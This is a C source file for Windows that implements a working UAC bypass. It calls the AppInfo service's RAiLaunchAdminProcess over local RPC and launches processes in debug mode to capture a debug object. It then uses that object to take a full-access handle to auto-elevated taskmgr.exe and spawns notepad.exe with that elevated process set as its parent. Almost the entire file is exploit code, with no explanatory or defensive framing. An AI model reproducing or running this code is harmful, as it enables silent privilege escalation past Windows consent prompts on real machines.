#include <stdio.h>
#include <windows.h>
#include <rpcdce.h>
#include "boo_h.h"
#include "boo.h"

handle_t BindingHandle = NULL;

NTSTATUS BindingRpc(){
    RPC_STATUS status;
    unsigned int  cMinCalls = 1;
    RPC_SECURITY_QOS SecurityQOS = {};
    RPC_WSTR StringBinding = nullptr;
    status = RpcStringBindingComposeW((RPC_WSTR)L"201ef99a-7fa0-444c-9399-19ba84f12a1a", (RPC_WSTR)L"ncalrpc", 0,NULL, nullptr, &StringBinding);

    if (status) {
        printf("RpcStringBindingComposeW Failed:%d\n", status);
        return(status);
    }

    status = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
    RpcStringFreeW(&StringBinding);
    if (status) {
        printf("RpcBindingFromStringBindingW Failed:%d\n", status);
        return(status);
    }
    SecurityQOS.Version = 1;
    SecurityQOS.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    SecurityQOS.Capabilities = RPC_C_QOS_CAPABILITIES_DEFAULT;
    SecurityQOS.IdentityTracking = RPC_C_QOS_IDENTITY_STATIC;

    status = RpcBindingSetAuthInfoExW(BindingHandle, 0, 6u, 0xAu, 0, 0, (RPC_SECURITY_QOS*)&SecurityQOS);
    if (status) {
        printf("RpcBindingSetAuthInfoExW Failed:%d\n", status);
        return(status);
    }

    status = RpcEpResolveBinding(BindingHandle, boo_v1_0_c_ifspec);

    if (status) {
        printf("RpcEpResolveBinding Failed:%d\n", status);
        return(status);
    }

    return status;
}

VOID AicpAsyncCloseHandle(
    _Inout_ RPC_ASYNC_STATE* AsyncState)
{
    if (AsyncState->u.hEvent) {
        CloseHandle(AsyncState->u.hEvent);
        AsyncState->u.hEvent = NULL;
    }
}


RPC_STATUS AicpAsyncInitializeHandle(
    _Inout_ RPC_ASYNC_STATE* AsyncState)
{
    RPC_STATUS status;

    status = RpcAsyncInitializeHandle(AsyncState, sizeof(RPC_ASYNC_STATE));
    if (status == RPC_S_OK) {
        AsyncState->NotificationType = RpcNotificationTypeEvent;
        AsyncState->u.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
        if (AsyncState->u.hEvent == NULL)
            status = GetLastError();
    }

    return status;
}

BOOLEAN AicLaunchAdminProcess(
    _In_opt_ LPWSTR ExecutablePath,
    _In_opt_ LPWSTR CommandLine,
    _In_ DWORD StartFlags,
    _In_ DWORD CreationFlags,
    _In_ LPWSTR CurrentDirectory,
    _In_ LPWSTR WindowStation,
    _In_opt_ HWND hWnd,
    _In_ DWORD Timeout,
    _In_ DWORD ShowFlags,
    _Out_ PROCESS_INFORMATION* ProcessInformation
)
{
    BOOLEAN bResult = FALSE;
    RPC_BINDING_HANDLE rpcHandle;
    RPC_ASYNC_STATE asyncState;
    APP_PROCESS_INFORMATION procInfo;
    APP_STARTUP_INFO appStartup;
    RPC_STATUS status;
    VOID* Reply = NULL;

    LONG elevationType = 0;

    if (ProcessInformation) {
        ProcessInformation->hProcess = NULL;
        ProcessInformation->hThread = NULL;
        ProcessInformation->dwProcessId = 0;
        ProcessInformation->dwThreadId = 0;
    }

    RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
    RtlSecureZeroMemory(&appStartup, sizeof(appStartup));

    appStartup.dwFlags = STARTF_USESHOWWINDOW;
    appStartup.wShowWindow = (SHORT)ShowFlags;

    RtlSecureZeroMemory(&asyncState, sizeof(RPC_ASYNC_STATE));

    if ((BindingRpc() == RPC_S_OK) &&
        (AicpAsyncInitializeHandle(&asyncState) == RPC_S_OK))
    {
        rpcHandle = BindingHandle;
        __try {

            RAiLaunchAdminProcess(&asyncState,
                rpcHandle,
                ExecutablePath,
                CommandLine,
                StartFlags,
                CreationFlags,
                CurrentDirectory,
                WindowStation,
                &appStartup,
                (ULONG_PTR)hWnd,
                Timeout,
                &procInfo,
                &elevationType);

            if (WaitForSingleObject(asyncState.u.hEvent, INFINITE) == WAIT_FAILED)
            {
                RpcRaiseException(-1);
            }

            status = RpcAsyncCompleteCall(&asyncState, &Reply);
            if (status == 0 && Reply == NULL) {

                if (ProcessInformation) {
                    ProcessInformation->hProcess = (HANDLE)procInfo.ProcessHandle;
                    ProcessInformation->hThread = (HANDLE)procInfo.ThreadHandle;
                    ProcessInformation->dwProcessId = (DWORD)procInfo.ProcessId;
                    ProcessInformation->dwThreadId = (DWORD)procInfo.ThreadId;
                }

                bResult = TRUE;

            }

            AicpAsyncCloseHandle(&asyncState);

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            SetLastError(RpcExceptionCode());
            return FALSE;
        }

        RpcBindingFree(&rpcHandle);
    }

    return bResult;
}

BOOL initNtfunc(){
    HINSTANCE hdll = LoadLibrary(L"ntdll.dll");
    if (hdll) {
        NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hdll, "NtQueryInformationProcess");
        NtRemoveProcessDebug = (pNtRemoveProcessDebug)GetProcAddress(hdll, "NtRemoveProcessDebug");
        DbgUiSetThreadDebugObject = (pDbgUiSetThreadDebugObject)GetProcAddress(hdll, "DbgUiSetThreadDebugObject");
        NtDuplicateObject = (pNtDuplicateObject)GetProcAddress(hdll, "NtDuplicateObject");
        NtClose = (pNtClose)GetProcAddress(hdll, "NtClose");
        if (NtQueryInformationProcess && NtRemoveProcessDebug && DbgUiSetThreadDebugObject && NtDuplicateObject && NtClose)
            return TRUE;
    }
    
    return FALSE;
}



int main(){

    if (!initNtfunc())
        return 0;
	NTSTATUS status = BindingRpc();
    if (status == ERROR_SUCCESS){
        PROCESS_INFORMATION procInfo;
        AicLaunchAdminProcess((LPWSTR)L"C:\\Windows\\System32\\notepad.exe", NULL,0,CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,(LPWSTR)L"c:\\windows",(LPWSTR)L"WinSta0\\Default",NULL,INFINITE,SW_HIDE, &procInfo);

        HANDLE dbgHandle = NULL;
        status = NtQueryInformationProcess(procInfo.hProcess,ProcessDebugObjectHandle,&dbgHandle,sizeof(HANDLE),NULL);

        if (!NT_SUCCESS(status)) {
            TerminateProcess(procInfo.hProcess, 0);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            printf("NtQueryInformationProcess erro %d  status %X \n", GetLastError(), status);
            return 0;
        }

        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);

        //twice
        AicLaunchAdminProcess((LPWSTR)L"C:\\Windows\\System32\\taskmgr.exe",NULL,1,CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,(LPWSTR)L"c:\\windows",(LPWSTR)L"WinSta0\\Default",NULL,INFINITE,SW_HIDE,&procInfo);

        DbgUiSetThreadDebugObject(dbgHandle);

        HANDLE dbgProcessHandle = NULL;
        HANDLE dupHandle = NULL;

        DEBUG_EVENT dbgEvent;
        while (1) {
            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                break;
            switch (dbgEvent.dwDebugEventCode) {
            case CREATE_PROCESS_DEBUG_EVENT:
                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
                break;
            }
            if (dbgProcessHandle)
                break;
            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
        }

        if (!dbgProcessHandle)
            return 0;

        status = NtDuplicateObject(dbgProcessHandle,(HANDLE)-1,(HANDLE)-1, &dupHandle, PROCESS_ALL_ACCESS,0,0);

        if (NT_SUCCESS(status)) {
            STARTUPINFOEX si;
            PROCESS_INFORMATION pi;
            RtlSecureZeroMemory(&pi, sizeof(pi));
            RtlSecureZeroMemory(&si, sizeof(si));
            SIZE_T size = 0x30;
            si.StartupInfo.cb = sizeof(STARTUPINFOEX);
            si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(0x30);
            if (si.lpAttributeList) {
                if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                    if (UpdateProcThreadAttribute(si.lpAttributeList, 0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &dupHandle, sizeof(HANDLE), 0, 0)){

                        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                        si.StartupInfo.wShowWindow = SW_SHOW;

                        if (CreateProcess(L"C:\\Windows\\System32\\notepad.exe",
                            NULL,
                            NULL,
                            NULL,
                            FALSE,
                            CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
                            NULL,
                            (LPWSTR)L"c:\\windows",
                            (LPSTARTUPINFO)&si,
                            &pi))
                        {
                            CloseHandle(pi.hThread);
                            CloseHandle(pi.hProcess);
                        }
                    }

                }
            }
            if (si.lpAttributeList)
                DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
            free(si.lpAttributeList);

            NtClose(dupHandle);
        }

        DbgUiSetThreadDebugObject((HANDLE)NULL);//恢复当前线程

        NtClose(dbgHandle);
        dbgHandle = NULL;
        CloseHandle(dbgProcessHandle);
        CloseHandle(procInfo.hThread);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);
    }else
        printf("BindingRpc erro %d \n", GetLastError());
    
	

	return 0;
}

/******************************************************/
/*         MIDL allocate and free                     */
/******************************************************/

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
	free(ptr);
}